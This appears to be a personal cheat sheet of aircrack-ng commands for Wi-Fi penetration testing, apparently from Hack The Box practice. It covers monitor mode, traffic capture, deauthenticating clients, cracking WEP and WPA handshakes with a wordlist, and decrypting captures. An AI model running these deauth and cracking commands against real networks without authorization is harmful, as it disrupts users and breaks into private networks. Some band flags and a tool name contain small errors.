# WI-FI CODE SNIPPETS

---

## Setup
Set router to max power
```
ifconfig wlan1 down
```
```
iwconfig wlan1 txpower 30
```
```
ifconfig wlan1 up
```
Preemptively kill everything that gets in your way:
```
airmon-ng check kill
```
Start monitor mode:
```
airmon-ng start wlan1
```
Save what's out there to a file:
```
sudo airodump-ng wlan1mon --band agp -w dump
```

---

```
iwconfig
```
Grab all networks nearby:
```
iwlist wlan1 s | grep 'Cell\|Quality\|ESSID\|IEEE\|Mode\|Frequency\|Channel\|Quality\|Signal Level' | tee wifi_scan.txt
```
If things are weird:
```
airmon-ng check kill
```
&
```
systemctl restart NetworkManager
```

---

## Airmon-ng
### Start monitor mode:
```
airmon-ng start wlan1
```
### Stop monitor mode:
```
airmon-ng stop wlan0mon
```

---

## Airodump-ng
### Dump network traffic to file:
airodump-ng is configured to scan exclusively for networks operating on the 2.4 GHz band so use `--band abg` if necessary
```
airodump-ng wlan1mon --band a -w dump
```

---

## Airgraph-ng
### Visualize APs and Clients with:
Use airodump-ng `.csv`s
```
airgraph-ng -i dump-01.csv -g CAPR -o dumpCAPR.png
```
OR for CPG:
```
airgraph-ng -i HTB-01.csv -g CPG -o dumpCPG.png
```
Test with: (Injection Working!)
```
aireplay-ng --test wlan0mon
```

---

## Aireplay-ng
```
aireplay-ng
```
```
aireplay-ng -0 5 -a ACCESSPOINTBSSID -c CLIENTBSSID wlan1mon
```

---

## Aircrack-ng
Benchmark with this command, it will tell you how many passphrases you can crack a second, it's dependent on what else is using the CPU:
```
aircrack-ng -S
```
Crack WEP Key, use `--ivs` in aurodump-ng command to only capture the IVs (Initialization Vectors). Once enough are captured:
```
aircrack-ng -K HTB.ivs
```
Crack WPA, make sure the "four-way handshake" is in the `.pcap` by deauthing client from AP.
```
aircrack-ng HTB.pcap -w /opt/wordlist.txt
```

---

## Airdecap-ng
Need network passphrase / WEP Key and the `.pcap` file of captured traffic
```
airdecap-ng
```
Decrypt WEP
```
airdecap-ng -w <WEP-key> <capture-file>
```
Decrypt WPA:
```
airdecap-ng -p <passphrase> <capture-file> -e <essid>
```

---






# EXTRAS
Note that it is possible to connect to APs via CLI
## Rasberry Pi MAC address ranges:
```
28:CD:C1:xx:xx:xx
B8:27:EB:xx:xx:xx
D8:3A:DD:xx:xx:xx
DC:A6:32:xx:xx:xx
E4:5F:01:xx:xx:xx
```

---

## Install Alpha Adapter
Configuring the Alpha AWUS036ACH Wi-Fi Adapter - [Link](https://medium.com/@wicked_picker/configuring-the-alpha-awus036ach-wi-fi-adapter-on-kali-linux-eb5ec2826713)
See available USBs:
```
lsusb
```
Then see it NOT here:
```
iwconfig
```
Install the Realtek drivers:
```
sudo apt-get install realtek-rtl88xxau-dkms
```
Install dkms:
```
sudo apt-get install dkms
```
Download the rtl8812au drivers from GitHub
```
git clone https://github.com/aircrack-ng/rtl8812au
```
```
cd rtl8812au
```
Preemptively fix the error:
```
sudo apt-get install linux-headers-$(uname -r)
```
```
make
```
```
sudo make install
```
```
reboot
```
```
iwconfig
```

---


